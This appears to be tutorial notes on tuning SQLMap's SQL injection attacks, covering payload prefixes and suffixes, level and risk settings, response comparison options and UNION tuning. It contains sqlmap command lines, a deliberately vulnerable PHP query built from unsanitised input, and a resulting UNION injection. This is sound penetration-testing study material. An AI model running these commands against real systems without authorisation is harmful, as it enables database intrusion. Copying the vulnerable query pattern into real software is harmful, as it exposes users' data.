# Attack Tuning

In most cases, SQLMap runs out of the box with provided target details. However, options exist to fine-tune SQLi injection attempts during detection.

Every payload consists of:
- **Vector** (e.g., `UNION ALL SELECT 1,2,VERSION()`): Central SQL code to execute
- **Boundaries** (e.g., `'<vector>-- -`): Prefix/suffix for proper injection

## Prefix/Suffix

Use `--prefix` and `--suffix` for special cases:

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Example with vulnerable PHP code:
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
```

Results in valid SQL:
```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

## Level and Risk

| Option | Range | Purpose |
|--------|-------|---------|
| `--level` | 1-5 (default: 1) | Extends vectors/boundaries by success expectancy |
| `--risk` | 1-3 (default: 1) | Extends vectors by database modification risk |

**Note:** Default uses 72 payloads; `--level=5 --risk=3` uses 7,865 payloads.

Use `-v 3` to view payloads:
```bash
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

## Advanced Tuning

### Status Codes
Use `--code` to fixate TRUE responses to specific HTTP codes:
```bash
sqlmap -u "..." --code=200
```

### Titles
Use `--titles` to base comparison on HTML `<title>` content.

### Strings
Use `--string` to detect specific values in TRUE responses:
```bash
sqlmap -u "..." --string=success
```

### Text-only
Use `--text-only` to remove HTML tags and compare visible content only.

### Techniques
Restrict payloads to specific SQLi techniques with `--technique`:
```bash
sqlmap -u "..." --technique=BEU
```
(B=Boolean, E=Error, U=UNION, T=Time-based, S=Stacked)

## UNION SQLi Tuning

- `--union-cols=<num>`: Specify exact column count
- `--union-char='<char>'`: Use alternative filling value instead of NULL/integer
- `--union-from=<table>`: Add FROM clause (required for Oracle)
